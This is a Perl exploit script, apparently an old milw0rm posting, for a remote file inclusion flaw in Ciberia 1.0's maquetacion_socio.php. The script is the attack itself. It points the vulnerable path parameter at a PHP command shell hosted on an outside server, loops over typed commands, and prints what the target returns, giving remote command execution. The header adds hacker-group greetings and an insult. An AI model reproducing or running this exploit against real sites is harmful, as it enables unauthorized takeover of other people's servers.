
rtal Name : ciberia 1.0<(Ciberia Content Federator)>(maquetacion_socio.php) Remote File Inclusion Exploit
# BUG: [Path]/socios/maquetacion_socio.php?path=Dr.Trojan.TxT
# Vulnerable Code: 1-include "$path/datos/datos_socios.php"; 2-include "$path/elementos/actos.php"; 3-include "$path/datos/datos_ciberinvitados.php";
# Bug Found DeltahackingTEAM Discovery :Dr.Pantagon Expl0iteT:Dr.Trojan
##
# Download =http://switch.dl.sourceforge.net/sourceforge/ciberia/ciberia-1.0.1.tar.gz
##
# usage:perl deltaSecurity.pl <target> <cmd shell location> <cmd shell variable>
#
#
# perl deltaSecurity.pl  http://[target]/[Path]/socios/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
##
#Greetz: Hiv++, D_7j ,Vpc,Lord,Str0ke,
#
# Contact:dr.trojan[A]deltasecurity.ir info[A]takserver.ir Davood_cracker[A]yahoo.com
##
# WebSite:www.deltasecurity.ir
##
#128 Bit Security Server:www.takserver.ir
##
#SP FUCK.............: z_zer0c00l(floozie Mother Test 100%=z_zer0c00l=misbegotten:D)..........
##

use LWP::UserAgent;
$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}
head();
while()
{
      print "[shell] \$";
while(<STDIN>)
      {
              $cmd=$_;
               chomp($cmd);
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'maquetacion_socio.php?path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd) or die "\nCould Not connect\n";
$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[?..?.??]/;
if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}
elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
      {print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
 elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
if($return =~ /(.*)/)
 {
      $finreturn = $1;
      $finreturn=~ tr/[?..?.??]/[\n]/;
     print "\r\n$finreturn\n\r";
       last;
 } else {print "[shell] \$";}}}last;
sub head()
 {
 print "\n============================================================================\r\n";
 print " *We Are 1 in Iran & 4in W0rld 0ur Server:http://takserver.ir
                      Farzad Sharifi *\r\n";
 print
 "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: perl deltasecurity.pl <target> <cmd shell location> <cmd shellvariable>\r\n\n";

 print " <Site> - Full path to wob-0.1 ex: http://[target]/[Path]/socios/ \r\n";
 print "<cmd shell> - Path to cmd Shell e.g http://d4wood.by.ru/cmd.gif \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "                         Bug Found DeltahackingTEAM \r\n";
 print "                       Iranian Are The Best In World \r\n";
 print "                Dr.Trojan,HIV++,D_7j,Lord,VPc,,Dr.Pantagon,\r\n";
 print "                      http://advistory.deltasecurity.ir((0ur Bug))\r\n";
 print "                         http://www.deltasecurity.ir\r\n";
 print "                         Dr.Trojan&&&&&&&&&&&&&&Dr.Pantagon";
 print "============================================================================\r\n";
 exit();
 }

# milw0rm.com [2006-12-25]